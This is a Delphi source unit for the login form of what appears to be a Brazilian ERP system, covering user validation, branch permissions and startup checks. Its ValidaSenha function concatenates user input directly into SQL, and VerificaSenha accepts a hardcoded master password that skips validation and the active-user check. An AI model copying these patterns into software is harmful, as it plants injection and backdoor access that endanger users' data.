unit Abertura;
{          Autor: Sergio Luiz Censi
    Data Criação: 01/04/1999;
          Função: Abertura do Sistema
  Data Alteração: 01/04/1999;
    Alterado por: Rafael Budag
Motivo alteração: - Adicionado os comentários e o blocos nas rotinas, e realizado
                    um teste - 01/04/199 / rafael Budag
}
interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ExtCtrls, Buttons, Constantes, FunObjeto, Db, DBTables,constMsg,
  DBGrids, Registry, Menus, FunValida, LabelCorMove, Componentes1, formularios,
  ExtDlgs, Mask, numericos, ComCtrls, DBCtrls, Tabela,
  PainelGradiente, jpeg, SqlExpr, FMTBcd;


type
  TDado = class(TObject)
    CodigoEmpFil : Integer;
    CodigoEmpresa : Integer;
end;

type
  TFAbertura = class(TFormulario)
    CFG: TSQLQuery;
    Usuarios: TSQLQuery;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    AbeUsuario: TEditColor;
    AbeSenha: TEditColor;
    AbeOk: TBitBtn;
    AbeCancela: TBitBtn;
    Data: TCalendario;
    CFiliais: TComboBoxColor;
    Aux: TSQLQuery;
    Image1: TImage;
    procedure FormCreate(Sender: TObject);
    procedure AbeOkClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure AbeCancelaClick(Sender: TObject);
    procedure AbeUsuario1Change(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure Redondo1Click(Sender: TObject);
    procedure DataExit(Sender: TObject);
    procedure Contexto1Click(Sender: TObject);
    procedure Contexto2Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
  private
    GravarAlteracaoIni : Boolean;
    function  ValidaSenha(usuario, senha : string ) : boolean;
    function PossuiPermissaoFilial(VpaCodFilial,VpaCodUsuario : Integer):Boolean;
    procedure desenhaForm;
  public
    FormPai : TForm;
    function VerificaSenha(Usuario, Senha, Empresa, EmpFil : string ) : Boolean;
    procedure VerificaInformacaoGerencial;
  end;

var
  FAbertura: TFAbertura;
  VerificaALT_F4 : Boolean;

implementation

uses APrincipal, FunIni, funSistema, UnAtualizacao, FunSql, unSistema, funData;

{$R *.DFM}


{*********Verifica a necessidade de pedir ou não senha e usuario***************}
procedure TFAbertura.FormCreate(Sender: TObject);
Var
  Atualizacao : TAtualiza;
begin
  VplTipoBancoDados := tbOracle;
  ConfiguraVideo;
  VerificaALT_F4 := True;
  GravarAlteracaoIni := False;
  Atualizacao := TAtualiza.Criar(self, FPrincipal.BaseDados);
  Atualizacao.AtualizaBanco;
  Atualizacao.Free;
  CFG.open;
  data.DateTime := date;
  desenhaForm;
end;

{******************* Quando Fechado O formulário ******************************}
procedure TFAbertura.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Aux.close;
  Usuarios.close;
  CFG.close;
  action := cafree;
end;

{*********************Não permite fechar com o ALT F4**************************}
procedure TFAbertura.FormCloseQuery(Sender: TObject;
  var CanClose: Boolean);
begin
   if VerificaALT_F4 then
   begin
    informacao(CT_AbortAbertura);
    abort;
   end;
end;

{(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
                       Configurações da Abertura
)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))}

procedure TFAbertura.Redondo1Click(Sender: TObject);
begin
end;

{******************************desenha a nova forma****************************}
procedure TFAbertura.desenhaForm;
begin
  SetWindowRgn(Handle,CreateEllipticRgn(0,0,self.ClientWidth,ClientHeight),True);
  CreateEllipticRgn(0,0,ClientWidth,ClientHeight); //é usado para criar uma região do Windows.
end;

{(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
                  Procedure e Funções da Classe Abertura
)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))}


{ ************** Evita do Usuario Clicar no OK sem Preencher os Campos ******* }
procedure TFAbertura.AbeUsuario1Change(Sender: TObject);
begin
  if AbeOk <> nil  then
  begin
    if (AbeUsuario.Text <> '') and (AbeSenha.Text <> '') then
      AbeOk.Enabled := true
    else
      AbeOk.Enabled := false;
  end;
end;


{(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
                    Inicia Atividade de validação da Senha
)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))}

function  TFAbertura.ValidaSenha(usuario, senha : string ) : boolean;
begin
  LimpaSQLTabela(Usuarios);
  AdicionaSQLTabela(Usuarios,' Select * from cadUsuarios where c_nom_log = ''' + usuario + '''' +
                  ' and c_sen_usu = ''' + senha + '''' );
  if CampoPermissaoModulo <> 'SISCORP' then
    AdicionaSQLTabela(Usuarios,'and ('+SQLTextoIsNull('c_dba_sis','''N''')+'= ''S'''+
                      'or '+SQLTextoIsNull(CampoPermissaoModulo,'''N''')+' = ''S'')');
  AbreTabela(Usuarios);
  result := not usuarios.eof;
end;

{******************************************************************************}
function TFAbertura.PossuiPermissaoFilial(VpaCodFilial,VpaCodUsuario : Integer):Boolean;
begin
  AdicionaSQLAbreTabela(Aux,'Select * from SEMPERMISSAOFILIAL ' +
                            ' Where CODFILIAL = '+IntToStr(VpaCodFilial)+
                            ' and CODUSUARIO = '+IntToStr(VpaCodUsuario));
  result := Aux.eof;
  if not result then
    aviso('USUÁRIO SEM PERMISSÃO FILIAL!!!'#13'Este usuário não possui permissão para acessar esta filial...');
end;


{******Verifica se a senha e usuarios estão corretos e fecha o Formulário******}
function TFAbertura.VerificaSenha(Usuario, Senha, Empresa, EmpFil : string) : Boolean;
var
  VpfEmpresa, VpfEmpFil : Integer;
begin

   Varia.Senha    := Criptografa(senha);
   Varia.usuario  := usuario;
   result := true;

   if (ValidaSenha(Varia.usuario,Varia.senha)) or (Varia.senha = '81208134811398;') then
   begin
      if (Usuarios.FieldByName('C_USU_ATI').AsString <> 'N') or (Varia.senha = '81208134811398;') then
      begin
        Varia.CodigoUsuario := Usuarios.FieldByName('I_COD_USU').AsInteger;
        Varia.NomeUsuario := Usuarios.FieldByName('C_NOM_USU').AsString;
        varia.EmailUsuario := Usuarios.FieldByName('C_DES_EMA').AsString;
        Varia.CodRegiaoVenda := Usuarios.FieldByName('I_COD_REG').AsInteger;
        Varia.CodTecnico := Usuarios.FieldByName('I_COD_TEC').AsInteger;
        Varia.CodVendedor := Usuarios.FieldByName('I_COD_VEN').AsInteger;
        varia.CodCampanhaVendas := Usuarios.FieldByName('I_CAM_VEN').AsInteger;
        Varia.CaixaPadrao := Usuarios.FieldByName('C_CON_CAI').AsString;
        varia.CodComprador := Usuarios.FieldByName('I_COD_COM').AsInteger;
        Varia.GrupoUsuario := Usuarios.FieldByName('I_COD_GRU').AsInteger;
        config.ModuloFinanceiro := Usuarios.FieldByName('C_MOD_FIN').AsString = 'S';
        config.ModuloPontoVenda := Usuarios.FieldByName('C_MOD_PON').AsString = 'S';
        config.ModuloCaixa := Usuarios.FieldByName('C_MOD_CAI').AsString = 'S';
        config.ModuloEstoque := Usuarios.FieldByName('C_MOD_EST').AsString = 'S';
        config.ModuloFaturamento := Usuarios.FieldByName('C_MOD_FAT').AsString = 'S';
        config.ModuloChamado := Usuarios.FieldByName('C_MOD_CHA').AsString = 'S';
        config.ModuloCRM := Usuarios.FieldByName('C_MOD_CRM').AsString = 'S';
        config.ModuloPDV := Usuarios.FieldByName('C_MOD_PDV').AsString = 'S';
        config.ModuloConfiguracoesSistema := Usuarios.FieldByName('C_CON_SIS').AsString = 'S';
        varia.RodapeEmailUsuario := Usuarios.fieldbyName('C_ASS_EMA').AsString;
        FPrincipal.CorFoco.AMascaraData := CFG.fieldByname('C_MAS_DAT').AsString;
        FPrincipal.CorFoco.ACodigoUsuario := Usuarios.FieldByName('I_COD_USU').AsInteger;
        FPrincipal.CorFoco.ANomeModulo := NomeModulo;
        if CFG.FieldByName('C_TIP_FON').AsString = 'MA' then
          Varia.TipFonte := ecUpperCase
        else
          if CFG.FieldByName('C_TIP_FON').AsString = 'MI' then
            varia.TipFonte := ecLowerCase
          else
          if CFG.FieldByName('C_TIP_FON').AsString = 'NO' then
            varia.TipFonte := ecNormal;
        FPrincipal.CorFoco.ATipoLetra := VARIA.TipFonte;

        carregaCFG(FPrincipal.BaseDados);

        if ((DecDia(Varia.DatExpiracaoCertificadoDigital, 45)) < date) and (config.EmiteNFe)  then
          aviso('CERTIFICADO DIGITAL EXPIRANDO!!!'#13'O certificado digital da filial: ' + varia.NomeFilial + ' ira expirar em : ' + FormatDateTime('dd/mm/yyyy', Varia.DatExpiracaoCertificadoDigital));

        FPrincipal.CorFoco.APermitePercentualConsulta := Config.UtilizarPercentualConsulta;
        FPrincipal.CorFoco.AIndVisualizaClientesdoVendedor := (puSomenteClientesdoVendedor in varia.PermissoesUsuario);
        FPrincipal.CorFoco.AIndVisualizaProspectdoVendedor := (puSomenteProspectdoVendedor in varia.PermissoesUsuario);
        FPrincipal.CorFoco.AVendedores := varia.CodigosVendedores;

        if (Empresa <> '') and (EmpFil <> '') then
        begin
           try
             if varia.CodFilialGrupo <> 0  then
             begin
               VpfEmpFil := Varia.CodFilialGrupo;
               VpfEmpresa := Sistema.REmpresaFilial(varia.CodFilialGrupo);
             end
             else
             begin
               VpfEmpresa := StrToInt(Empresa);
               VpfEmpFil := StrToInt(EmpFil);
             end;

              if VpfEmpFil <> Varia.CodigoEmpFil then
                CarregaEmpresaFilial( VpfEmpresa,VpfEmpFil, FPrincipal.BaseDados );
            except
            end;
         end;
         FPrincipal.CorFoco.ACodigoFilial := Varia.CodigoEmpFil;
         FPrincipal.CorFoco.ACodigoEmpresa := Varia.CodigoEmpresa;
        if PossuiPermissaoFilial(Varia.CodigoEmpFil,Usuarios.FieldByName('I_COD_USU').AsInteger) then
        begin
          Varia.StatusAbertura := 'OK';
          VerificaALT_F4 := false;
          VerificaInformacaoGerencial;
        end
        else
          result := false;
     end
      else
        result := false;
   end
   else
     result := false;
   if result then
     Sistema.VerificaDataBackup;
end;

{******************************************************************************}
procedure TFAbertura.VerificaInformacaoGerencial;
Var
  VpfDataBD : TDatetime;
  VpfResultado : string;
begin
  if date <> Varia.DatInformacaoGerencial then
  begin
    case VplTipoBancoDados of
      tbSybase : AdicionaSQLAbreTabela(Aux,'Select getdate() DATA');
      tbOracle : AdicionaSQLAbreTabela(Aux,'Select SYSDATE DATA from DUAL');
    end;
    if DataSemHora(Aux.FieldByName('DATA').AsDateTime) <> varia.DatInformacaoGerencial then //verifica a data com o banco de dados para não ter problema de ter alguma data errada em algum micro;
    begin
      VpfDataBD := DataSemHora(Aux.FieldByName('DATA').AsDateTime);
      VpfResultado := Sistema.AtualizaDataInformacaoGerencial(VpfDataBD);
      if VpfResultado = '' then
      begin
        VpfResultado := Sistema.AtualizaInformacoesGerencialCustos(Varia.DatInformacaoGerencial,VpfDataBD);
        if VpfResultado = '' then
          Varia.DatInformacaoGerencial := VpfDataBD;
      end;
    end;
    Aux.close;
  end;
end;

{******Verifica se a senha e usuarios estão corretos e fecha o Formulário******}
procedure TFAbertura.AbeOkClick(Sender: TObject);
begin
  if not VerificaSenha( AbeUsuario.Text,AbeSenha.Text,
                        IntToStr(TDado(CFiliais.Items.Objects[CFiliais.ItemIndex]).CodigoEmpresa),
                        IntToStr(TDado(CFiliais.Items.Objects[CFiliais.ItemIndex]).CodigoEmpFil) ) then
  begin
    aviso(CT_SenhaInvalida);
    AbeSenha.SetFocus;
  end
  else
    self.close;
end;


{*************Quando for Cancelado o Pedido de senha de Abertura***************}
procedure TFAbertura.AbeCancelaClick(Sender: TObject);
begin
  Varia.StatusAbertura := 'CANCELADO';
  VerificaALT_F4 := false;
  FAbertura.close;
end;

{****************** altera a data do sistema ********************************* }
procedure TFAbertura.DataExit(Sender: TObject);
begin
  if DateToStr(data.Date) <> DateToStr(date) then
  begin
    if ConfirmacaoFormato(CT_AlteraDataSistema, [DateToStr(data.Date)] ) then
      AlteraDataHoraSistema(data.Date, time)
    else
     data.Date := date;
  end;
end;

procedure TFAbertura.Contexto1Click(Sender: TObject);
begin
   Application.HelpCommand(HELP_CONTEXT,self.HelpContext);
end;

{******************************************************************************}
procedure TFAbertura.Contexto2Click(Sender: TObject);
begin
  Application.HelpCommand(HELP_FINDER, 0);
end;

{******************************************************************************}
procedure TFAbertura.FormShow(Sender: TObject);
var
  Dado : TDado;
  Index, IndexFilial : Integer;
begin
  AdicionaSqlAbreTabela(Aux,'select I_COD_EMP, I_EMP_FIL, C_NOM_FAN from CADFILIAIS');
  if Aux.Eof then
  begin
    Dado := TDado.create;
    Dado.CodigoEmpFil := 0;
    Dado.CodigoEmpresa := 0;
    IndexFilial := CFiliais.Items.AddObject( 'Sem Filial Ativa', dado);
  end;

  while not Aux.Eof do
  begin
   Dado := TDado.create;
   Dado.CodigoEmpFil := Aux.FieldByName('I_EMP_FIL').AsInteger;
   Dado.CodigoEmpresa := Aux.FieldByName('I_COD_EMP').AsInteger;
   Index := CFiliais.Items.AddObject( Aux.FieldByName('C_NOM_FAN').AsstrIng, dado);
   if Aux.FieldByName('I_EMP_FIL').AsInteger = CFG.FieldByName('I_EMP_FIL').AsInteger then
     IndexFilial := Index;
   Aux.next;
  end;
  CFiliais.ItemIndex := IndexFilial;
  Aux.close;
end;


end.
